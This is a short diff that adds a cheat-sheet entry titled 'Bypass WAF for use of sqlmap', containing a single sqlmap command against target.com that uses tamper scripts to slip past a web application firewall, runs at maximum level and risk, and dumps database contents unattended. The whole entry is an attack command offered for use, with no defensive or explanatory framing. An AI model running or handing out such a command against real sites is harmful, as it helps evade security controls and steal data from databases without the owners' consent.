@@ -1,0 +1,3 @@
+Bypass WAF for use of sqlmap:
+-----------------------------
+sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump 
